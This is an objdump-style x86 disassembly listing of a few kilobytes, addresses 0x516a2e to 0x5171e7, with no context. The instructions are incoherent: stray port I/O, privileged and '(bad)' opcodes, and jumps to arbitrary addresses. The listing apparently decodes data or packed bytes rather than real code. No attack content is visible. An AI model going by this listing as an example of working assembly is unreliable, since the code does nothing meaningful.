  516a2e:	sub    BYTE PTR [esi-0x14f0222c],0x98
  516a35:	sbb    dl,BYTE PTR [eax+0x27]
  516a38:	xchg   edi,eax
  516a39:	jno    0x516a4f
  516a3b:	pop    edi
  516a3c:	xor    al,0x4a
  516a3e:	imul   eax,DWORD PTR [esi+0x47a49a85],0x6be5231b
  516a48:	mov    esi,0x78188d34
  516a4d:	cmp    al,0x8f
  516a4f:	out    0xe6,eax
  516a51:	push   ds
  516a52:	or     bh,cl
  516a54:	stos   BYTE PTR es:[edi],al
  516a55:	out    dx,al
  516a56:	inc    esi
  516a57:	in     eax,0xd7
  516a59:	cmp    ebp,DWORD PTR [edi+0x471a28a7]
  516a5f:	mov    dl,0xc
  516a61:	cli    
  516a62:	int    0x89
  516a64:	jge    0x516a7f
  516a66:	je     0x516ae2
  516a68:	sbb    esi,ebp
  516a6a:	inc    esp
  516a6b:	adc    DWORD PTR [eax-0x58],ebx
  516a6e:	fadd   DWORD PTR [ecx+eax*1]
  516a71:	arpl   WORD PTR [esi],cx
  516a73:	sub    BYTE PTR [eax-0x7352cb0b],dh
  516a79:	stos   BYTE PTR es:[edi],al
  516a7a:	call   0xa5e1593c
  516a7f:	push   0x219e6727
  516a84:	xchg   esi,eax
  516a85:	jns    0x516b04
  516a87:	lds    eax,FWORD PTR [esi]
  516a89:	cdq    
  516a8a:	xor    cl,BYTE PTR [ebx+0xc53a81f]
  516a90:	repnz aam 0x4f
  516a93:	mov    edi,0x67fd6dc9
  516a98:	ins    BYTE PTR es:[edi],dx
  516a99:	cmc    
  516a9a:	test   BYTE PTR [eax-0x1afa5d3d],ch
  516aa0:	popf   
  516aa1:	cld    
  516aa2:	shl    BYTE PTR [eax],0x54
  516aa5:	cdq    
  516aa6:	adc    al,dl
  516aa8:	repnz dec ebx
  516aaa:	out    dx,eax
  516aab:	and    eax,esp
  516aad:	push   ebp
  516aae:	and    DWORD PTR [ecx-0x77],0x2e
  516ab2:	test   eax,0x617b8f79
  516ab7:	jae    0x516a3a
  516ab9:	stos   DWORD PTR es:[edi],eax
  516aba:	xor    edx,edx
  516abc:	rcl    BYTE PTR [edx-0x3b06e158],cl
  516ac2:	and    bh,BYTE PTR [ebp-0x7ddae4ae]
  516ac8:	rcl    BYTE PTR [edx],1
  516aca:	lods   eax,DWORD PTR ds:[esi]
  516acb:	add    DWORD PTR [edi+0x3b],ebp
  516ace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  516acf:	fisub  WORD PTR [ebx-0x4f84ed5a]
  516ad5:	jge    0x516b1d
  516ad7:	xchg   BYTE PTR [esi-0x55],dl
  516ada:	jmp    0x516ad8
  516adc:	je     0x516a6c
  516ade:	(bad)  
  516adf:	jl     0x516ab6
  516ae1:	sbb    eax,0x42abbaf4
  516ae6:	dec    eax
  516ae7:	sbb    al,0xf6
  516ae9:	xor    eax,DWORD PTR [esi]
  516aeb:	aam    0xd1
  516aed:	pop    esi
  516aee:	add    al,0x65
  516af0:	inc    ebp
  516af1:	cmp    DWORD PTR [esi-0x5e],eax
  516af4:	mov    esi,DWORD PTR [edi+0x1b]
  516af7:	inc    esi
  516af8:	mov    dl,0xb0
  516afa:	cmp    DWORD PTR [esi+0x57],eax
  516afd:	or     al,0x3e
  516aff:	repz out dx,al
  516b01:	push   ecx
  516b02:	inc    ebp
  516b03:	pop    ss
  516b04:	dec    edx
  516b05:	ror    DWORD PTR [eax],0x1f
  516b08:	lods   eax,DWORD PTR ds:[esi]
  516b09:	push   0x26
  516b0b:	(bad)  
  516b0c:	div    edx
  516b0e:	pop    ecx
  516b0f:	mov    ecx,0xb8fc4ed0
  516b14:	push   ds
  516b15:	mov    ebp,DWORD PTR [ebp-0x69cd303d]
  516b1b:	cmp    al,0x7a
  516b1d:	aad    0x81
  516b1f:	inc    edi
  516b20:	mov    edx,0x6aceab0c
  516b25:	aaa    
  516b26:	cs loopne 0x516b46
  516b29:	pop    esi
  516b2a:	mov    ecx,0xbab7c2a4
  516b2f:	hlt    
  516b30:	jg     0x516b72
  516b32:	stos   BYTE PTR es:[edi],al
  516b33:	aas    
  516b34:	pop    ecx
  516b35:	or     eax,0xe10e5b79
  516b3a:	mov    WORD PTR [eax+0x446a89fc],ds
  516b40:	jp     0x516b88
  516b42:	xchg   ebx,eax
  516b43:	enter  0x31dd,0x40
  516b47:	sub    al,0x5c
  516b49:	leave  
  516b4a:	into   
  516b4b:	test   BYTE PTR ds:0xacc38b52,dl
  516b51:	dec    ebp
  516b52:	out    dx,eax
  516b53:	scas   al,BYTE PTR es:[edi]
  516b54:	push   esi
  516b55:	stos   DWORD PTR es:[edi],eax
  516b56:	jmp    0x8c18a301
  516b5b:	popa   
  516b5c:	ffree  st(2)
  516b5e:	xor    BYTE PTR [edi],dl
  516b60:	jl     0x516b9a
  516b62:	std    
  516b63:	or     bl,BYTE PTR [edx-0x35c2f8d8]
  516b69:	stos   DWORD PTR es:[edi],eax
  516b6a:	push   esp
  516b6b:	xor    dh,ah
  516b6d:	sub    BYTE PTR [edi+ebx*8-0x2e],bh
  516b71:	push   ebx
  516b72:	stos   DWORD PTR es:[edi],eax
  516b73:	rol    DWORD PTR [edx],cl
  516b75:	mov    al,ds:0xca9900f0
  516b7a:	out    0x35,al
  516b7c:	idiv   DWORD PTR [ebx]
  516b7e:	jns    0x516b6e
  516b80:	retf   0x6366
  516b83:	jns    0x516b11
  516b85:	add    ecx,ecx
  516b87:	xchg   edx,eax
  516b88:	or     al,BYTE PTR [eax-0x768f75a]
  516b8e:	xor    dl,al
  516b90:	int    0x5b
  516b92:	aam    0x7e
  516b94:	ret    0x8dea
  516b97:	push   ebx
  516b98:	stos   BYTE PTR es:[edi],al
  516b99:	mov    eax,0x6337edfc
  516b9e:	in     eax,0x70
  516ba0:	fmul   QWORD PTR [esi+0x51]
  516ba3:	nop
  516ba4:	dec    esi
  516ba5:	pop    eax
  516ba6:	push   ecx
  516ba7:	fcmovnu st,st(5)
  516ba9:	stos   DWORD PTR es:[edi],eax
  516baa:	inc    ebp
  516bab:	xlat   BYTE PTR ds:[ebx]
  516bac:	ror    BYTE PTR [ecx-0x26],0x10
  516bb0:	mov    dh,0xb9
  516bb2:	ins    BYTE PTR es:[edi],dx
  516bb3:	add    edx,ebx
  516bb5:	or     al,0x28
  516bb7:	or     eax,0x5c61672c
  516bbc:	das    
  516bbd:	inc    edx
  516bbe:	or     eax,0x7b5bfaf7
  516bc3:	add    BYTE PTR [eax-0x32],0x8c
  516bc7:	shl    DWORD PTR [eax-0x7],1
  516bca:	sub    esp,DWORD PTR [ecx-0x23f4d245]
  516bd0:	inc    ebp
  516bd1:	jbe    0x516c48
  516bd3:	into   
  516bd4:	or     BYTE PTR [edx],dl
  516bd6:	mov    dh,0x16
  516bd8:	push   ebx
  516bd9:	xor    esp,ebp
  516bdb:	ss fs and al,0xa0
  516bdf:	mov    eax,0x55406ac7
  516be4:	sbb    BYTE PTR [ebx],ah
  516be6:	mov    cs,WORD PTR [ecx]
  516be8:	jbe    0x516bf9
  516bea:	pusha  
  516beb:	mov    ?,WORD PTR [edx]
  516bed:	fbld   TBYTE PTR ds:0x63d69cd2
  516bf3:	add    edi,eax
  516bf5:	test   al,0xc
  516bf7:	retf   0x3428
  516bfa:	and    edx,DWORD PTR [esi+eiz*2-0xab145e0]
  516c01:	lea    ebx,[ecx]
  516c03:	pusha  
  516c04:	fild   QWORD PTR ds:0x398e4239
  516c0a:	cs ds mov ebx,0x49840e56
  516c11:	aas    
  516c12:	scas   eax,DWORD PTR es:[edi]
  516c13:	jns    0x516bc9
  516c15:	fild   DWORD PTR [ebp-0x44b33163]
  516c1b:	gs jl  0x516c42
  516c1e:	jbe    0x516bb1
  516c20:	out    0xe1,al
  516c22:	lock xchg ebp,eax
  516c24:	cmp    al,0x94
  516c26:	or     eax,0xb4c49f5b
  516c2b:	cmp    al,0x70
  516c2d:	mov    ds:0x721cc406,al
  516c32:	cmp    edx,DWORD PTR ds:0x5a28e3bf
  516c38:	pop    ebp
  516c39:	(bad)  
  516c3a:	jl     0x516c6d
  516c3c:	jge    0x516c75
  516c3e:	fistp  DWORD PTR ds:0x7f69a4b8
  516c45:	push   ecx
  516c46:	aad    0x6c
  516c48:	jmp    0xfc6f5f8
  516c4d:	adc    bl,BYTE PTR [ebx-0x2f]
  516c50:	pushf  
  516c51:	dec    edi
  516c52:	dec    edi
  516c53:	xor    dh,BYTE PTR [edi+0x4663555b]
  516c59:	and    DWORD PTR [eax+eax*2-0x27d5cf12],edx
  516c60:	out    dx,al
  516c61:	xor    BYTE PTR [esi+0x2eaffb32],al
  516c67:	inc    edi
  516c68:	xchg   ebp,eax
  516c69:	mov    gs,WORD PTR [ecx]
  516c6b:	in     al,dx
  516c6c:	mov    ebx,0x8a4bfa12
  516c71:	inc    edi
  516c72:	nop
  516c73:	stos   BYTE PTR es:[edi],al
  516c74:	sbb    al,0xcf
  516c76:	mov    BYTE PTR [edi],ch
  516c78:	push   0xffffffd3
  516c7a:	xchg   edx,eax
  516c7b:	push   ss
  516c7c:	push   ebp
  516c7d:	stc    
  516c7e:	lahf   
  516c7f:	or     eax,0xeec2037f
  516c84:	sbb    BYTE PTR [ecx+edx*8-0x14],ch
  516c88:	sbb    BYTE PTR [edi],cl
  516c8a:	fidiv  WORD PTR [edi-0x4fc361e6]
  516c90:	pop    edx
  516c91:	cs test al,0x63
  516c94:	stos   BYTE PTR es:[edi],al
  516c95:	jge    0x516ca5
  516c97:	bound  ecx,QWORD PTR [esi]
  516c99:	icebp  
  516c9a:	push   edi
  516c9b:	in     al,dx
  516c9c:	and    esi,esp
  516c9e:	mov    eax,ds:0x1b04a0b9
  516ca3:	sbb    al,0xb
  516ca5:	pop    esi
  516ca6:	imul   edi,eax,0x253550c6
  516cac:	fstp   QWORD PTR [ebp+0x619aca00]
  516cb2:	std    
  516cb3:	hlt    
  516cb4:	mov    ch,0x1f
  516cb6:	hlt    
  516cb7:	cwde   
  516cb8:	imul   ah
  516cba:	sbb    al,0x15
  516cbc:	mov    eax,0xb38a1150
  516cc1:	test   BYTE PTR [ecx],dh
  516cc3:	push   ebp
  516cc4:	lahf   
  516cc5:	enter  0x8ac4,0xa6
  516cc9:	jmp    0x516d4a
  516ccb:	fistp  WORD PTR [edi-0x2a]
  516cce:	mov    ch,cl
  516cd0:	jmp    0xcd63db09
  516cd5:	sub    BYTE PTR [ecx],ch
  516cd7:	pop    edx
  516cd8:	shl    ecx,cl
  516cda:	jge    0x516d1f
  516cdc:	xchg   ebx,eax
  516cdd:	outs   dx,BYTE PTR ds:[esi]
  516cde:	sub    BYTE PTR [esi+ebx*1-0x33],ch
  516ce2:	dec    ebp
  516ce3:	fsub   DWORD PTR [eax-0x55]
  516ce6:	inc    ecx
  516ce7:	adc    edx,ebx
  516ce9:	adc    BYTE PTR [ebx+0x5d486a91],0xe3
  516cf0:	pop    ds
  516cf1:	mov    ds:0xfeb8f73e,eax
  516cf6:	add    bl,BYTE PTR [ebx]
  516cf8:	and    al,0x8a
  516cfa:	and    cl,ah
  516cfc:	jp     0x516ce9
  516cfe:	test   al,0x8c
  516d00:	call   0x671:0x2a703fa7
  516d07:	(bad)  
  516d08:	popf   
  516d09:	cli    
  516d0a:	push   edi
  516d0b:	clc    
  516d0c:	in     al,dx
  516d0d:	out    0x14,eax
  516d0f:	(bad)  
  516d10:	adc    esi,DWORD PTR [ebx-0x40730d75]
  516d16:	loop   0x516cb9
  516d18:	xor    al,0x17
  516d1a:	dec    esp
  516d1b:	pop    ebx
  516d1c:	mov    al,ds:0x3455e139
  516d21:	inc    ebx
  516d22:	imul   esp,DWORD PTR ds:0x4b571cd9,0xe1bb8da1
  516d2c:	shl    BYTE PTR [edx],1
  516d2e:	jp     0x516ce3
  516d30:	fwait
  516d31:	adc    al,ah
  516d33:	mov    ch,0x28
  516d35:	cs pop esi
  516d37:	sbb    eax,0x7085ec89
  516d3c:	mov    edx,0xbd6bcca1
  516d41:	fisttp DWORD PTR [ecx+edi*8+0x4f]
  516d45:	inc    ecx
  516d46:	cmp    DWORD PTR [esi+0x39],0xc097d164
  516d4d:	push   eax
  516d4e:	in     eax,0x2b
  516d50:	fisub  WORD PTR [edi+edx*8-0x17aee8da]
  516d57:	(bad)  
  516d58:	and    al,0xd1
  516d5a:	inc    ebp
  516d5b:	in     al,dx
  516d5c:	mov    dl,0xe
  516d5e:	or     al,0x9f
  516d60:	imul   eax,DWORD PTR [ecx-0x723cc8d3],0xffffff82
  516d67:	xor    eax,0x5fae3f14
  516d6c:	dec    ebp
  516d6d:	inc    esp
  516d6e:	or     edx,edi
  516d70:	(bad)  
  516d71:	mov    eax,DWORD PTR [ebp-0x22b3e4b2]
  516d77:	xchg   edi,eax
  516d78:	add    DWORD PTR [esi+0x6c],ebp
  516d7b:	popa   
  516d7c:	cmp    al,0x2c
  516d7e:	add    ah,BYTE PTR [ebx+0x7bd53563]
  516d84:	add    eax,0xf876fbb4
  516d89:	les    ecx,FWORD PTR [edi]
  516d8b:	or     al,0x46
  516d8e:	pop    ebx
  516d8f:	mov    al,ds:0x71bd7680
  516d94:	mov    WORD PTR [edx],ds
  516d96:	stos   DWORD PTR es:[edi],eax
  516d97:	loopne 0x516d50
  516d99:	repnz push es
  516d9b:	mov    ah,0x8d
  516d9d:	xor    dh,0x9a
  516da0:	xor    ecx,DWORD PTR ds:0xeef1a899
  516da6:	adc    edx,DWORD PTR [ebx]
  516da8:	pushf  
  516da9:	mov    al,0xbf
  516dab:	loopne 0x516d31
  516dad:	fld    TBYTE PTR [ecx+ecx*1]
  516db0:	inc    ebp
  516db1:	fbstp  TBYTE PTR [ebx-0x58]
  516db4:	add    dl,BYTE PTR [esi-0x7a]
  516db7:	push   ecx
  516db8:	jmp    0xe9ac:0x157a489d
  516dbf:	imul   ecx,DWORD PTR [edx+0x1c0ebb78],0x11
  516dc6:	test   ebp,edx
  516dc8:	js     0x516df9
  516dca:	dec    DWORD PTR [eax]
  516dcc:	cmp    al,0x17
  516dce:	sbb    cl,BYTE PTR [eax+0x2f]
  516dd1:	clc    
  516dd2:	xchg   DWORD PTR [edx],ebp
  516dd4:	ret    0xbff0
  516dd7:	cmp    al,0x5a
  516dd9:	sbb    al,0x29
  516ddb:	pop    ds
  516ddc:	inc    ebx
  516ddd:	retf   0xd152
  516de0:	out    0x45,al
  516de2:	dec    ecx
  516de3:	lahf   
  516de4:	and    eax,0xa47dee9c
  516de9:	popa   
  516dea:	inc    edi
  516deb:	push   es
  516dec:	push   0xffffffbc
  516dee:	inc    esp
  516def:	xor    BYTE PTR [ecx-0x20e6f25b],0x1b
  516df6:	lahf   
  516df7:	xchg   esp,edi
  516df9:	mov    ds:0xf6960f1f,al
  516dfe:	sub    DWORD PTR [ebp+0x3be111c8],0x4e
  516e05:	fstp   QWORD PTR [ecx+0x32]
  516e08:	aaa    
  516e09:	xchg   DWORD PTR [esi+0x27594c8f],esp
  516e0f:	cmp    ecx,DWORD PTR [ecx-0x21]
  516e12:	sbb    BYTE PTR [edx+0x56856e70],ah
  516e18:	es js  0x516db2
  516e1b:	pop    esp
  516e1c:	sbb    esi,esp
  516e1e:	sub    al,0xff
  516e20:	jg     0x516e4a
  516e22:	and    DWORD PTR [edi],ebp
  516e24:	inc    ebp
  516e25:	fbstp  TBYTE PTR [ecx-0x2]
  516e28:	nop
  516e29:	jmp    0xeb8800bc
  516e2e:	push   edx
  516e2f:	cdq    
  516e30:	push   eax
  516e31:	and    dh,BYTE PTR [esp+edi*8-0x58]
  516e35:	mov    bl,0xb2
  516e37:	in     al,0x8d
  516e39:	pushf  
  516e3a:	jl     0x516dce
  516e3c:	pop    DWORD PTR [eax+0x47]
  516e3f:	add    bh,al
  516e41:	test   esp,edi
  516e43:	jmp    0x2aa907a0
  516e48:	adc    DWORD PTR [esi+edx*2],ebx
  516e4b:	or     ebp,DWORD PTR [edi+0x7579add2]
  516e51:	dec    esp
  516e52:	ds and eax,0xd46b39e4
  516e58:	adc    esp,ecx
  516e5a:	xor    eax,0x8bbb16bf
  516e5f:	push   edi
  516e60:	scas   eax,DWORD PTR es:[edi]
  516e61:	fwait
  516e62:	mov    eax,ds:0xc4ee032f
  516e67:	jb     0x516e61
  516e69:	or     edx,edi
  516e6b:	jo     0x516e35
  516e6d:	shl    DWORD PTR ds:0x720ba8b4,0x32
  516e74:	adc    DWORD PTR [eax-0x64],edi
  516e77:	div    BYTE PTR ds:0xec4f1b92
  516e7d:	(bad)  
  516e7e:	or     eax,0xbf23b9a
  516e83:	jbe    0x516eb2
  516e85:	cmp    BYTE PTR [edi],dl
  516e87:	mov    esi,0x81ef76de
  516e8c:	iret   
  516e8d:	test   eax,0x7e1a7094
  516e92:	out    0x17,al
  516e94:	jno    0x516e9f
  516e96:	repnz sub ch,dl
  516e99:	push   0x457e397a
  516e9e:	cmp    al,0x83
  516ea0:	or     BYTE PTR [ecx],ch
  516ea2:	aaa    
  516ea3:	inc    ebx
  516ea4:	cmp    DWORD PTR [edx-0xb],ebx
  516ea7:	popa   
  516ea8:	pushf  
  516ea9:	add    eax,0xb149ac0
  516eae:	aam    0x36
  516eb0:	ror    BYTE PTR [ecx],cl
  516eb2:	jns    0x516e52
  516eb4:	out    dx,al
  516eb5:	or     eax,0xf723d9b9
  516eba:	push   0x39
  516ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  516ebd:	imul   esp,esp,0xc7f637e4
  516ec3:	call   0x53ae:0x810a5511
  516eca:	shr    BYTE PTR [ebx-0x3bd649c6],cl
  516ed0:	dec    esp
  516ed1:	mov    esp,0xfa17e964
  516ed6:	inc    ecx
  516ed7:	dec    esp
  516ed8:	fwait
  516ed9:	popa   
  516eda:	mov    ebx,0xe456f335
  516edf:	in     eax,0x2d
  516ee1:	popf   
  516ee2:	sbb    BYTE PTR ds:0xe4acad22,cl
  516ee8:	mov    ds:0xfd7dfc63,eax
  516eed:	jbe    0x516ede
  516eef:	cmp    DWORD PTR [eax+edi*1-0x43],0x1d
  516ef4:	push   ebp
  516ef5:	mov    eax,ds:0x42523c0b
  516efa:	and    bl,BYTE PTR [edi-0x61902b07]
  516f00:	add    DWORD PTR [ecx-0x750b82d6],ebp
  516f06:	sub    bh,BYTE PTR [ecx-0x38658102]
  516f0c:	xor    bl,BYTE PTR [edx-0x3dd10efa]
  516f12:	repz (bad) 
  516f15:	cmp    esi,edi
  516f17:	lods   al,BYTE PTR ds:[esi]
  516f18:	xchg   esi,eax
  516f19:	or     dh,BYTE PTR [ebx+0x48]
  516f1c:	in     eax,0x6
  516f1e:	retf   0xcf68
  516f21:	inc    ebx
  516f22:	xchg   esi,eax
  516f23:	cmp    DWORD PTR [ebx],esp
  516f25:	ror    DWORD PTR [eax],1
  516f27:	ret    
  516f28:	out    dx,eax
  516f29:	mov    esp,edx
  516f2b:	imul   ebx,DWORD PTR [edx],0x27a8cc11
  516f31:	push   0x17829dd8
  516f36:	sbb    eax,ebp
  516f38:	popf   
  516f39:	into   
  516f3a:	or     al,0xaa
  516f3c:	mov    edi,0xaec9af98
  516f41:	pop    ebx
  516f42:	cmp    ebp,DWORD PTR [edi+ebp*8]
  516f45:	mov    BYTE PTR [esi-0x3514a090],0xcb
  516f4c:	push   ebp
  516f4d:	jns    0x516f9e
  516f4f:	jg     0x516f0a
  516f51:	dec    edi
  516f52:	cmp    al,BYTE PTR [esi-0x767fca4b]
  516f58:	dec    ecx
  516f59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  516f5a:	sbb    ebx,DWORD PTR [esi]
  516f5c:	lahf   
  516f5d:	dec    ebp
  516f5e:	cwde   
  516f5f:	sbb    al,0x22
  516f61:	das    
  516f62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  516f63:	push   esi
  516f64:	mov    dh,BYTE PTR [esi]
  516f66:	bswap  ebp
  516f68:	or     DWORD PTR [ecx+0x212f3fb3],0x70
  516f6f:	int3   
  516f70:	enter  0x5c4b,0x38
  516f74:	push   es
  516f75:	clc    
  516f76:	push   0xf92ff1ac
  516f7b:	inc    esi
  516f7c:	repnz push cs
  516f7e:	ins    BYTE PTR es:[edi],dx
  516f7f:	cmp    DWORD PTR [edx+ebx*1-0x221f8327],edi
  516f86:	je     0x516fb9
  516f88:	dec    ebp
  516f89:	add    BYTE PTR [edx-0x7f],dl
  516f8c:	sti    
  516f8d:	sub    ebx,DWORD PTR [eax]
  516f8f:	xchg   esp,eax
  516f90:	xchg   esi,eax
  516f91:	jmp    0xdb3c8c0e
  516f96:	and    BYTE PTR [ecx+0x20],cl
  516f99:	adc    ecx,DWORD PTR [edx+0x53]
  516f9c:	push   0xffffffb7
  516f9e:	(bad)  
  516f9f:	nop
  516fa0:	sbb    eax,0xd9eba36c
  516fa5:	push   0x48
  516fa7:	fidiv  DWORD PTR [eax]
  516fa9:	fcmovnu st,st(3)
  516fab:	fucomp st(6)
  516fad:	cmp    eax,0x1e4f7589
  516fb2:	and    al,0x53
  516fb4:	add    dh,bh
  516fb6:	scas   al,BYTE PTR es:[edi]
  516fb7:	dec    ecx
  516fb8:	(bad)  
  516fb9:	out    0x7f,eax
  516fbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  516fbc:	ret    
  516fbd:	mov    al,BYTE PTR [ecx-0x4d]
  516fc0:	cmp    al,0x4a
  516fc2:	test   ebp,edx
  516fc4:	ret    0x7d77
  516fc7:	or     BYTE PTR [esp+ebx*4],0xff
  516fcb:	ins    DWORD PTR es:[edi],dx
  516fcc:	pop    edx
  516fcd:	mov    al,0x64
  516fcf:	mov    ah,0x33
  516fd1:	psubsw mm7,QWORD PTR [edx-0x3953764c]
  516fd8:	pop    esi
  516fd9:	vmread DWORD PTR [ecx-0x564f4268],edx
  516fe0:	sbb    esp,DWORD PTR [edx]
  516fe2:	loop   0x516fd5
  516fe4:	push   es
  516fe5:	push   ecx
  516fe6:	or     esp,ebp
  516fe8:	xchg   ecx,eax
  516fe9:	xor    esi,eax
  516feb:	adc    eax,0x53102cfc
  516ff0:	jle    0x517048
  516ff2:	mov    ah,0xfa
  516ff4:	xor    eax,0x486c4c33
  516ff9:	sbb    DWORD PTR ds:0x1fa0bba0,edx
  516fff:	scas   eax,DWORD PTR es:[edi]
  517000:	mov    al,ds:0x49dce3a9
  517005:	rcl    esp,cl
  517007:	sbb    al,0xea
  517009:	pushf  
  51700a:	xchg   ebp,eax
  51700b:	push   ecx
  51700c:	jecxz  0x517013
  51700e:	push   0xffffffec
  517010:	mov    edx,0xca937f72
  517015:	adc    eax,0x6463b31e
  51701a:	push   ss
  51701b:	mov    DWORD PTR [edx],eax
  51701d:	inc    edi
  51701e:	pusha  
  51701f:	mov    ds:0x4b84c254,al
  517024:	or     eax,eax
  517026:	or     DWORD PTR [edx-0x4071e5cd],edi
  51702c:	mov    dl,BYTE PTR [ebx-0x32]
  51702f:	push   ss
  517030:	jp     0x516fd6
  517032:	add    ecx,DWORD PTR [eax+0x302741c3]
  517038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  517039:	test   BYTE PTR [eax+edx*1-0x4a00f709],0x93
  517041:	imul   esp,DWORD PTR [ecx],0xb7ac124e
  517047:	push   cs
  517048:	push   eax
  517049:	mov    eax,ds:0xf0520ec2
  51704e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51704f:	jne    0x51708b
  517051:	sbb    ebx,DWORD PTR [eax+0x2a]
  517054:	jmp    DWORD PTR [ecx]
  517056:	mov    bl,0x34
  517058:	inc    edi
  517059:	cmp    dh,BYTE PTR [ebx-0x20e28578]
  51705f:	test   BYTE PTR ds:0x51004b7d,0xbe
  517066:	stc    
  517067:	add    eax,0x411d288e
  51706c:	test   DWORD PTR [esi-0x68],ebp
  51706f:	xchg   ecx,eax
  517070:	push   cs
  517071:	xor    al,0x1d
  517073:	or     eax,0x9b5913a9
  517078:	pop    ds
  517079:	push   edi
  51707a:	mov    dh,0x11
  51707c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  51707d:	adc    eax,0xec8cff29
  517082:	push   0x76
  517084:	fsubr  QWORD PTR [esi]
  517086:	cld    
  517087:	movzx  esp,WORD PTR [esi+0x6a619a43]
  51708e:	clc    
  51708f:	mov    DWORD PTR [ebp+0x1a7e76b2],esi
  517095:	arpl   WORD PTR [edi],sp
  517097:	adc    al,0x19
  517099:	xchg   DWORD PTR [eax],edi
  51709b:	add    cl,BYTE PTR [eax+0x54c08210]
  5170a1:	ds xchg ecx,eax
  5170a3:	inc    ecx
  5170a4:	xor    al,0xdd
  5170a6:	in     eax,0xa7
  5170a8:	aam    0xd4
  5170aa:	ds gs cmc 
  5170ad:	pop    ecx
  5170ae:	mov    bl,0x73
  5170b0:	stc    
  5170b1:	xchg   esi,eax
  5170b2:	es int 0x2e
  5170b5:	push   es
  5170b6:	fxch   st(1)
  5170b8:	pop    ss
  5170b9:	mov    ds,WORD PTR [ebp+0xe]
  5170bc:	mov    ebx,0x385ad115
  5170c1:	mov    eax,ds:0x4b36db5b
  5170c6:	dec    ebp
  5170c7:	push   0x32
  5170c9:	push   0x3c
  5170cb:	cmp    al,0xe5
  5170cd:	jb     0x5170aa
  5170cf:	retf   0x3055
  5170d2:	(bad)  
  5170d3:	cmc    
  5170d4:	jg     0x517098
  5170d6:	mov    ch,0xba
  5170d8:	lods   al,BYTE PTR ds:[esi]
  5170d9:	sbb    al,0xf
  5170db:	xchg   ebp,eax
  5170dc:	cmp    dl,BYTE PTR [ecx-0x7f]
  5170df:	sbb    eax,0x51bddf5d
  5170e4:	fwait
  5170e5:	inc    ebp
  5170e6:	lds    ebp,FWORD PTR [eax+eax*4]
  5170e9:	mov    bl,0xfe
  5170eb:	faddp  st(0),st
  5170ed:	mov    ebp,0xa4649eea
  5170f2:	jns    0x5170bf
  5170f4:	push   esi
  5170f5:	in     al,dx
  5170f6:	lock xor eax,0xe13efca4
  5170fc:	js     0x5170c7
  5170fe:	mov    edx,0xf7cc7917
  517103:	jo     0x517126
  517105:	icebp  
  517106:	adc    ebx,ebx
  517108:	retf   
  517109:	push   cs
  51710a:	jbe    0x517115
  51710c:	adc    cl,BYTE PTR [esp+edx*2]
  51710f:	mov    edx,DWORD PTR [ebx]
  517111:	jmp    0x5170c5
  517113:	xchg   edx,eax
  517114:	stc    
  517115:	daa    
  517116:	mov    ch,0x2a
  517118:	rcl    dl,cl
  51711a:	or     DWORD PTR [ecx+0x18],edi
  51711d:	sub    esi,DWORD PTR [ebp-0x687472c7]
  517123:	icebp  
  517124:	jbe    0x517161
  517126:	or     al,0x13
  517128:	lods   eax,DWORD PTR ds:[esi]
  517129:	inc    esp
  51712a:	jno    0x517196
  51712c:	pusha  
  51712d:	(bad)  
  51712e:	mov    eax,ds:0x1f4a858d
  517133:	icebp  
  517134:	lea    eax,[eax]
  517136:	je     0x5170d0
  517138:	jmp    0xe7db:0x940f2761
  51713f:	sbb    DWORD PTR [ebp-0x53],edi
  517142:	pushf  
  517143:	(bad)
  517147:	(bad)  
  517148:	adc    ebp,DWORD PTR [ebx-0x72963d2b]
  51714e:	fdivr  QWORD PTR [edi]
  517150:	in     eax,0x92
  517152:	test   BYTE PTR [edx-0x6f],ah
  517155:	sahf   
  517156:	adc    al,0x3f
  517158:	rol    bl,cl
  51715a:	add    al,0xe5
  51715c:	mov    cl,0xe5
  51715e:	retf   0x8eb
  517161:	std    
  517162:	mov    edi,0xda3be282
  517167:	xchg   ebx,eax
  517168:	sar    cl,1
  51716a:	inc    ebx
  51716b:	gs sub al,0x55
  51716e:	jp     0x517182
  517170:	adc    eax,0x5a27bdeb
  517175:	ja     0x51710d
  517177:	outs   dx,DWORD PTR ds:[esi]
  517178:	add    bl,BYTE PTR [edi]
  51717a:	das    
  51717b:	cmp    esi,DWORD PTR [esi-0x6f]
  51717e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51717f:	push   0x5a3f5335
  517184:	fwait
  517185:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  517186:	xchg   DWORD PTR [eax+0x29],eax
  517189:	clc    
  51718a:	sub    ch,BYTE PTR [ebx+0x4b]
  51718d:	cwde   
  51718e:	dec    esi
  51718f:	popa   
  517190:	loopne 0x5171e1
  517192:	loopne 0x5171e6
  517194:	dec    esp
  517195:	hlt    
  517196:	adc    ebp,esi
  517198:	fidivr DWORD PTR [edi+edx*2]
  51719b:	lods   al,BYTE PTR ds:[esi]
  51719c:	mov    ebx,0xaf9d0ab5
  5171a1:	push   es
  5171a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5171a3:	fxtract 
  5171a5:	or     DWORD PTR [ebx],ecx
  5171a7:	out    0xd6,al
  5171a9:	mov    esp,0xaa05987d
  5171ae:	cli    
  5171af:	clc    
  5171b0:	mov    ch,0xb4
  5171b2:	fsub   QWORD PTR [eax]
  5171b4:	std    
  5171b5:	pop    ds
  5171b6:	jns    0x5171c4
  5171b8:	lds    ebx,FWORD PTR [eax+0x4d]
  5171bb:	dec    esi
  5171bc:	call   0x5a151050
  5171c1:	fidivr DWORD PTR [eax]
  5171c3:	xchg   edx,eax
  5171c4:	sbb    ah,0xa0
  5171c7:	(bad)  
  5171c8:	xchg   ebx,eax
  5171c9:	popa   
  5171ca:	xchg   BYTE PTR [ebx+0x75676d52],ah
  5171d0:	cmp    eax,DWORD PTR [ebx]
  5171d2:	add    eax,0x6def0b4d
  5171d7:	je     0x5171dc
  5171d9:	iret   
  5171da:	test   eax,0xcbb635af
  5171df:	xor    eax,0x8c408d77
  5171e4:	aas    
  5171e5:	cmp    edx,eax
  5171e7:	cmp    BYTE PTR [ecx+0xddc85dc],bh
